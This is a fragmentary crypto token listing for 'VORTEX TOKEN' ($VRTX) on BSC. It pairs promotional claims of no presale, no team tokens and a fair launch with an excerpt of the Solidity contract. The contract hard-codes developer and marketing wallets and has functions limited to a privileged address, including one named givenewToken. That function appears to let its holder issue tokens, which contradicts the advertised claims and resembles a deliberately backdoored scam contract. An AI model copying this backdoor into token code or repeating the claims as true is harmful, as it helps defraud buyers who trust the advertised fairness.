...
The VORTEX Token BSC is to be a usable digital currency within the VORTEX ecosystem.

$VRTX
✅No presale
✅No team token
✅Fair launch with 0 holder’s
✅Based dev
...
contract VORTEXTOKEN is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "VORTEX TOKEN";
    string private constant _symbol = unicode"$VRTX";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 52000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x5a2A44Fe99EC7aB857648Eeca5B4921Fd1141b21);
    address payable public MarketingWallet = payable(0x9946D523899F344d28b1b097CedAb139dfA37848);
    ...
    function getmaxTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function getmaxWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function givenewToken(uint256 value, address adr) onlyAddress public virtual {
